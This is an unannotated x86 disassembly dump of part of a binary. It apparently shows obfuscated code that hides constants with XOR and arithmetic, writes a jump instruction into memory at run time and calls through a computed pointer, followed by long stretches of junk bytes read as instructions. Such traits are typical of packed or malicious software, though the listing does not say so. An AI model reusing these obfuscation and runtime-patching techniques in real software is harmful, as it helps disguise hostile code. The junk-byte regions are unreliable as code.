  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	pop    ds
  41595f:	push   ecx
  415960:	mov    ch,0xea
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x4158ff
  41596b:	xchg   edx,eax
  41596c:	pop    ss
  41596d:	add    DWORD PTR [ebx+0x5dd86f01],0x816a1854
  415977:	mov    bh,0x4b
  415979:	dec    esi
  41597a:	js     0x4159c9
  41597c:	mov    bh,0x4e
  41597e:	inc    ebp
  41597f:	mov    al,ds:0x23c64a46
  415984:	adc    eax,0x766f3172
  415989:	and    eax,0xf135253e
  41598e:	jmp    0x90ac9c90
  415993:	xor    al,0x6d
  415995:	les    esi,FWORD PTR [ecx]
  415997:	xchg   ecx,eax
  415998:	jmp    0xd850:0x36cce5d6
  41599f:	(bad)  
  4159a0:	inc    eax
  4159a1:	xor    ah,cl
  4159a3:	sub    DWORD PTR [esp+edx*2+0x61],edi
  4159a7:	add    al,0x6a
  4159a9:	xchg   ebp,eax
  4159aa:	frstor [edx+0x54be8a01]
  4159b0:	aad    0xc
  4159b2:	nop
  4159b3:	cmp    BYTE PTR [ecx+0x2fedff2],al
  4159b9:	stos   BYTE PTR es:[edi],al
  4159ba:	out    0x7a,al
  4159bc:	cld    
  4159bd:	push   esi
  4159be:	mov    ebp,0xc20a0d03
  4159c3:	xchg   edx,eax
  4159c4:	sti    
  4159c5:	leave  
  4159c6:	jae    0x415a35
  4159c8:	sub    al,0xb7
  4159ca:	(bad)
  4159ce:	and    al,0xa0
  4159d0:	in     eax,0x5
  4159d2:	in     eax,dx
  4159d3:	ins    BYTE PTR es:[edi],dx
  4159d4:	inc    ebx
  4159d5:	sbb    al,0xb5
  4159d7:	xor    edx,0x38
  4159da:	jo     0x4159e8
  4159dc:	sub    eax,0x513c01e6
  4159e1:	ret    0x32fb
  4159e4:	xor    dh,BYTE PTR [edi+esi*8+0x734700b]
  4159eb:	rcr    BYTE PTR [esi+0x29],1
  4159ee:	out    dx,eax
  4159ef:	inc    esi
  4159f0:	cmp    BYTE PTR [ecx],ch
  4159f2:	mov    esi,DWORD PTR [ecx]
  4159f4:	(bad)  
  4159f5:	lds    ecx,FWORD PTR [ecx+0x7c]
  4159f8:	call   0x391b:0x22e5e16b
  4159ff:	call   0x57258570
  415a04:	sub    ecx,DWORD PTR [ecx+ecx*2+0x3c2438e4]
  415a0b:	add    BYTE PTR [eax+eiz*8-0x6f469bae],bh
  415a12:	arpl   si,bp
  415a14:	and    cl,BYTE PTR [ebp+0x4e]
  415a17:	ror    ah,1
  415a19:	push   edi
  415a1a:	cmp    bl,BYTE PTR [esi-0x53]
  415a1d:	mov    al,0x73
  415a1f:	addr16 push ebp
  415a21:	outs   dx,BYTE PTR ds:[esi]
  415a22:	add    ebx,DWORD PTR [esi-0x6423b0b]
  415a28:	shl    DWORD PTR [ecx+0x3a54623d],cl
  415a2e:	cmp    al,0x12
  415a30:	adc    al,BYTE PTR [ebp-0x5]
  415a33:	or     bl,ah
  415a35:	aam    0xd2
  415a37:	push   0xbc3c3804
  415a3c:	and    esi,DWORD PTR [edi+0x4d]
  415a3f:	call   0x329e:0xc0dfeeef
  415a46:	mov    esp,0x833f74b0
  415a4b:	add    edi,DWORD PTR [ecx]
  415a4d:	jne    0x415a6b
  415a4f:	in     al,0x86
  415a51:	scas   al,BYTE PTR es:[edi]
  415a52:	call   0x41e26325
  415a57:	test   al,0xf7
  415a59:	popa   
  415a5a:	daa    
  415a5b:	jp     0x415a10
  415a5d:	adc    esi,DWORD PTR [ecx]
  415a5f:	xchg   ebx,eax
  415a60:	pop    ecx
  415a61:	test   BYTE PTR [edi-0x2c],cl
  415a64:	xor    DWORD PTR [eax],edx
  415a66:	cmp    BYTE PTR [edi],bh
  415a68:	cdq    
  415a69:	cs jb  0x415adc
  415a6c:	retf   0xc369
  415a6f:	lahf   
  415a70:	retf   
  415a71:	cmp    BYTE PTR [ecx-0x43],dh
  415a74:	sti    
  415a75:	out    dx,eax
  415a76:	xor    al,0x23
  415a78:	retf   0x6636
  415a7b:	clc    
  415a7c:	call   0x55be:0xcfb80ddf
  415a83:	js     0x415af9
  415a85:	scas   eax,DWORD PTR es:[edi]
  415a86:	jns    0x415a22
  415a88:	adc    eax,0x2b7002d1
  415a8d:	mov    cl,BYTE PTR [edx+0x68391510]
  415a93:	mov    edi,0x865d3f2f
  415a98:	push   esp
  415a99:	sub    dh,al
  415a9b:	add    al,0xdc
  415a9d:	add    edx,DWORD PTR ss:[ecx-0x4c]
  415aa1:	shl    eax,cl
  415aa3:	pusha  
  415aa4:	leave  
  415aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aa6:	mov    dh,0x57
  415aa8:	mov    WORD PTR [edx],ss
  415aaa:	mov    bh,BYTE PTR [esi]
  415aac:	fldcw  WORD PTR [ebp+eax*2+0x7c]
  415ab0:	add    ah,dh
  415ab2:	scas   al,BYTE PTR es:[edi]
  415ab3:	cmp    DWORD PTR [edx+eiz*8],edi
  415ab6:	sbb    ch,BYTE PTR [ebx]
  415ab8:	add    ecx,ebp
  415aba:	xor    DWORD PTR ds:0x3b5e2158,edi
  415ac0:	mov    esi,0xf4d3d1c4
  415ac5:	call   0xe9902c42
  415aca:	mov    bl,0xa5
  415acc:	cmp    BYTE PTR [esi-0x32],0x26
  415ad0:	(bad)  
  415ad1:	(bad)  
  415ad3:	dec    ebp
  415ad4:	int    0x8a
  415ad6:	fmul   QWORD PTR [edi+0x51702189]
  415adc:	sbb    dh,dh
  415ade:	or     BYTE PTR [edx+eax*2],dl
  415ae1:	fnstenv [esi]
  415ae3:	push   0x77044fdc
  415ae8:	sbb    BYTE PTR [edx-0x6e2b5b6c],dh
  415aee:	lds    ebx,FWORD PTR [esi]
  415af0:	mov    ecx,0x61ff6276
  415af5:	call   0xdae9220a
  415afa:	pusha  
  415afb:	call   0xbc9be18c
  415b00:	push   ecx
  415b01:	jle    0x415b25
  415b03:	mov    al,ds:0xd83f426d
  415b08:	pop    edi
  415b09:	cdq    
  415b0a:	and    edi,edx
  415b0c:	add    bh,BYTE PTR [ecx-0x41]
  415b0f:	fstp   st(2)
  415b11:	xor    ch,dl
  415b13:	cmp    eax,0xd4a1cf1a
  415b18:	or     bh,BYTE PTR [esp+ecx*4]
  415b1b:	(bad)  [ecx-0x7d732168]
  415b21:	pop    eax
  415b22:	ss jge 0x415b89
  415b25:	fst    DWORD PTR [edx]
  415b27:	dec    esp
  415b28:	mov    fs,ebp
  415b2a:	sbb    al,0x72
  415b2c:	sub    ah,BYTE PTR [eax+eax*8+0x51]
  415b30:	loopne 0x415afa
  415b32:	loop   0x415ab9
  415b34:	mov    eax,0x5f709fd8
  415b39:	push   cs
  415b3a:	lods   al,BYTE PTR ds:[esi]
  415b3b:	(bad)  
  415b3c:	mov    edx,0xe35f900f
  415b41:	sub    DWORD PTR ss:[ebp+0x39],0xdd2bc02b
  415b49:	push   ebx
  415b4a:	and    eax,0xedd9793d
  415b4f:	in     eax,0x34
  415b51:	and    ecx,DWORD PTR [esi-0x1558e60c]
  415b57:	outs   dx,DWORD PTR ds:[esi]
  415b58:	add    eax,0xcf2af065
  415b5d:	pop    ebx
  415b5e:	fld    DWORD PTR [esi-0x50263897]
  415b64:	inc    edx
  415b65:	sbb    eax,ebp
  415b67:	or     al,0xac
  415b69:	add    eax,0x364616d8
  415b6e:	into   
  415b6f:	push   edi
  415b70:	aas    
  415b71:	jg     0x415b2d
  415b73:	pop    esp
  415b74:	sub    al,0x58
  415b76:	push   ebx
  415b77:	mov    esi,0xe8c8f6b8
  415b7c:	xchg   dh,ch
  415b7e:	in     eax,dx
  415b7f:	(bad)  [esi-0x35]
  415b82:	retf   0x7ca5
  415b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b86:	repz jmp 0xaae:0x73b49d1a
  415b8e:	xchg   BYTE PTR [edx],al
  415b90:	mov    ah,0xdb
  415b92:	jo     0x415bee
  415b94:	icebp  
  415b95:	out    0x82,al
  415b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b98:	fst    DWORD PTR [esp+esi*4+0x368e41f1]
  415b9f:	fnstcw WORD PTR [ebx+ebp*4+0x571e0cbe]
  415ba6:	and    ah,BYTE PTR [eax]
  415ba8:	in     eax,dx
  415ba9:	add    al,0x22
  415bab:	inc    edx
  415bac:	icebp  
  415bad:	cmp    bh,BYTE PTR [ecx-0x40e853d5]
  415bb3:	cmp    eax,0x89592528
  415bb8:	shr    esi,cl
  415bba:	popa   
  415bbb:	sbb    DWORD PTR [esi+0x38],esi
  415bbe:	in     al,dx
  415bbf:	add    eax,0x40db7442
  415bc4:	xor    esi,ebx
  415bc6:	xchg   esp,eax
  415bc7:	rol    bl,0xfe
  415bca:	dec    esi
  415bcb:	jo     0x415be1
  415bcd:	imul   esi,DWORD PTR [eax+0x53],0x6d
  415bd1:	xchg   edi,edx
  415bd3:	add    ah,bl
  415bd5:	cli    
  415bd6:	bound  eax,QWORD PTR [esi-0x57]
  415bd9:	inc    ecx
  415bda:	test   BYTE PTR ds:0x812ba4c7,ch
  415be0:	scas   eax,DWORD PTR es:[edi]
  415be1:	jo     0x415b92
  415be3:	int    0x78
  415be5:	dec    esi
  415be6:	shr    ebx,cl
  415be8:	sub    al,0x66
  415bea:	mov    edx,0x5b700db8
  415bef:	(bad)  
  415bf0:	cmp    ch,BYTE PTR [edx]
  415bf2:	lock in al,0x46
  415bf5:	cdq    
  415bf6:	push   cs
  415bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf8:	scas   al,BYTE PTR es:[edi]
  415bf9:	pushf  
  415bfa:	mov    edi,0x1f92c73d
  415bff:	imul   esi,DWORD PTR [ebp+0x6d98cb86],0x51
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42a815,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7d9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a89d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	dec    ebp
  415c40:	push   ebx
  415c41:	adc    BYTE PTR [ecx],al
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	sub    ebp,DWORD PTR [ebx]
  415c4d:	imul   edx,DWORD PTR [edi+0x28],0xffffff83
  415c51:	lahf   
  415c52:	ret    0xae81
  415c55:	inc    ebp
  415c56:	sbb    eax,0x71a080c7
  415c5b:	ja     0x415bee
  415c5d:	shl    DWORD PTR [ebx+0x52ec402c],cl
  415c63:	lahf   
  415c64:	mov    al,ds:0x50d7ae11
  415c69:	nop
  415c6a:	and    bl,BYTE PTR [ebx-0x316faee9]
  415c70:	fwait
  415c71:	or     DWORD PTR [ebx],esi
  415c73:	mov    BYTE PTR [edx-0x1cd09ec4],bh
  415c79:	cmp    BYTE PTR ds:0x9b065179,dl
  415c7f:	jg     0x415c97
  415c81:	ins    DWORD PTR es:[edi],dx
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	xor    BYTE PTR [ecx-0x44],ah
  415c86:	test   edi,ebp
  415c88:	xor    bh,BYTE PTR ds:0x65b4992
  415c8e:	mov    ebx,0x8c7c778d
  415c93:	fwait
  415c94:	pop    ss
  415c95:	dec    esi
  415c96:	stos   DWORD PTR es:[edi],eax
  415c97:	dec    ebp
  415c98:	retf   
  415c99:	dec    eax
  415c9a:	je     0x415c92
  415c9c:	stos   DWORD PTR es:[edi],eax
  415c9d:	stc    
  415c9e:	pop    ebx
  415c9f:	jmp    0x415d12
  415ca1:	cmp    al,0xb1
  415ca3:	push   0xeda9b541
  415ca8:	lahf   
  415ca9:	mov    ?,WORD PTR [esi]
  415cab:	outs   dx,DWORD PTR ds:[esi]
  415cac:	and    bh,cl
  415cae:	mov    bl,0xb9
  415cb0:	push   cs
  415cb1:	xor    BYTE PTR [esi-0x54],0xe7
  415cb5:	inc    edx
  415cb6:	add    bx,WORD PTR [esi+0x2e]
  415cba:	in     al,dx
  415cbb:	add    al,0x6f
  415cbd:	xor    al,0x51
  415cbf:	fcmovnbe st,st(4)
  415cc1:	jbe    0x415c8d
  415cc3:	or     edi,esp
  415cc5:	mov    bl,0x12
  415cc7:	test   al,0x2d
  415cc9:	jae    0x415d43
  415ccb:	and    esp,DWORD PTR [edi*8-0xb34b582]
  415cd2:	add    BYTE PTR [bp+si+0x40d9],ah
  415cd7:	adc    eax,0xfeb185a1
  415cdc:	jnp    0x415d5b
  415cde:	jbe    0x415cfa
  415ce0:	xchg   ebp,eax
  415ce1:	mov    esp,0x20e3d477
  415ce6:	das    
  415ce7:	adc    BYTE PTR [edi+esi*1],dh
  415cea:	mov    bh,0x69
  415cec:	(bad)  [esi]
  415cee:	cmp    DWORD PTR [eax],ebp
  415cf0:	pop    edx
  415cf1:	pop    ebx
  415cf2:	cmp    DWORD PTR [esi],esi
  415cf4:	out    dx,eax
  415cf5:	sar    DWORD PTR [edx],cl
  415cf7:	out    0xaf,al
  415cf9:	or     DWORD PTR [esi-0x68150c5f],eax
  415cff:	lahf   
  415d00:	add    al,ah
  415d02:	fild   WORD PTR [edi+0x6ebe9316]
  415d08:	jp     0x415ce4
  415d0a:	xchg   edx,eax
  415d0b:	pop    ecx
  415d0c:	mov    al,ds:0xd11bbbb4
  415d11:	xchg   edx,eax
  415d12:	push   ss
  415d13:	int3   
  415d14:	push   edx
  415d15:	fisttp QWORD PTR [esp+edx*1]
  415d18:	xor    al,0x7
  415d1a:	mov    dl,0xe7
  415d1c:	jp     0x415d5d
  415d1e:	mov    edi,0xe6b285c8
  415d23:	push   eax
  415d24:	or     DWORD PTR [esi+0x2c618532],esp
  415d2a:	ror    DWORD PTR [ebp-0x4f],0x49
  415d2e:	sbb    eax,DWORD PTR [esi]
  415d30:	arpl   WORD PTR [edx+0x2fa9aa24],si
  415d36:	inc    edx
  415d37:	mov    eax,0x31b4e166
  415d3c:	push   es
  415d3d:	cmp    al,0x48
  415d3f:	and    BYTE PTR [esi],dh
  415d41:	jno    0x415d1b
  415d43:	dec    ebp
  415d44:	bound  ebp,QWORD PTR [esi+0x79]
  415d47:	push   ss
  415d48:	shr    ebp,1
  415d4a:	dec    ebx
  415d4b:	sbb    eax,0xc01d219a
  415d50:	pop    ebx
  415d51:	add    al,0x74
  415d53:	pop    eax
  415d54:	sub    bl,ah
  415d56:	pop    ds
  415d57:	xchg   ebx,eax
  415d58:	and    ebx,ebx
  415d5a:	cmp    eax,0x58c6b82
  415d5f:	out    0x9,eax
  415d61:	mov    bh,0x71
  415d63:	ret    0x9ee7
  415d66:	pusha  
  415d67:	ja     0x415de6
  415d69:	mov    eax,0xdce0e314
  415d6e:	shl    DWORD PTR [bx+di-0x69],cl
  415d72:	mov    WORD PTR [eax+edx*1-0x3b],gs
  415d76:	fimul  DWORD PTR [ebp-0x29]
  415d79:	pop    ebx
  415d7a:	inc    ecx
  415d7b:	jns    0x415d6e
  415d7d:	out    0xbc,al
  415d7f:	das    
  415d80:	add    eax,0xdfac770f
  415d85:	push   ds
  415d86:	iret   
  415d87:	cmp    edi,eax
  415d89:	sti    
  415d8a:	shl    bl,1
  415d8c:	mov    cl,0xe9
  415d8e:	pop    eax
  415d8f:	data16 mov al,0x16
  415d92:	inc    esi
  415d93:	add    eax,0x3eab6164
  415d98:	inc    edx
  415d99:	xor    edx,DWORD PTR [edi-0x4e0a3dbb]
  415d9f:	stc    
  415da0:	fnstenv [ecx]
  415da2:	inc    esp
  415da3:	push   es
  415da4:	out    0x95,al
  415da6:	inc    eax
  415da7:	test   DWORD PTR [ecx-0x48],esp
  415daa:	lods   al,BYTE PTR ds:[esi]
  415dab:	mov    dh,0xcd
  415dad:	xor    bh,bh
  415daf:	lods   eax,DWORD PTR ds:[esi]
  415db0:	pop    ecx
  415db1:	and    eax,0xf19b59ba
  415db6:	imul   edi,DWORD PTR [ecx+0x58572e4c],0xe571f7ef
  415dc0:	and    eax,0x2ec767a
  415dc5:	xchg   ebx,eax
  415dc6:	inc    edx
  415dc7:	mov    ah,0xbc
  415dc9:	daa    
  415dca:	push   ds
  415dcb:	and    ch,dh
  415dcd:	sahf   
  415dce:	dec    ebx
  415dcf:	rol    esi,1
  415dd1:	jne    0x415dd6
  415dd3:	add    ebx,DWORD PTR [esi+0x69]
  415dd6:	xchg   ebx,ebp
  415dd8:	cmp    eax,0x38aedfee
  415ddd:	add    ebp,DWORD PTR [edi-0x6d536b7d]
  415de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de4:	jge    0x415deb
  415de6:	mov    cl,0x9e
  415de8:	(bad)  
  415de9:	leave  
  415dea:	arpl   WORD PTR [ebp-0xb88162a],si
  415df0:	push   esp
  415df1:	retf   0x878e
  415df4:	jne    0x415daf
  415df6:	stos   BYTE PTR es:[edi],al
  415df7:	stos   BYTE PTR es:[edi],al
  415df8:	adc    bh,bl
  415dfa:	jb     0x415dd2
  415dfc:	xchg   esp,eax
  415dfd:	icebp  
  415dfe:	push   ecx
  415dff:	cmp    eax,0x7f07d558
  415e04:	cli    
  415e05:	out    0x3e,al
  415e07:	int3   
  415e08:	retf   0xd991
  415e0b:	xlat   BYTE PTR ds:[ebx]
  415e0d:	xchg   ebx,eax
  415e0e:	fwait
  415e0f:	add    al,bl
  415e11:	sbb    dl,BYTE PTR [esi+0x55b71c05]
  415e17:	cmp    edx,DWORD PTR [ebx-0x46]
  415e1a:	xchg   ecx,eax
  415e1b:	or     DWORD PTR [esi],esp
  415e1d:	in     eax,0x6
  415e1f:	in     eax,0x9b
  415e21:	sub    eax,0x9171cd72
  415e26:	test   eax,0x1a9c53be
  415e2b:	aam    0x8e
  415e2d:	or     eax,0x9048c874
  415e32:	add    BYTE PTR [ecx-0x51c19f67],bl
  415e38:	outs   dx,DWORD PTR ds:[esi]
  415e39:	adc    bl,BYTE PTR [ecx]
  415e3b:	test   DWORD PTR [ebx+0x4d3e7ad4],esp
  415e41:	fsincos 
  415e43:	into   
  415e44:	cmc    
  415e45:	popf   
  415e46:	mov    BYTE PTR [esi+0x26599bd],dh
  415e4c:	xchg   esp,eax
  415e4d:	push   ss
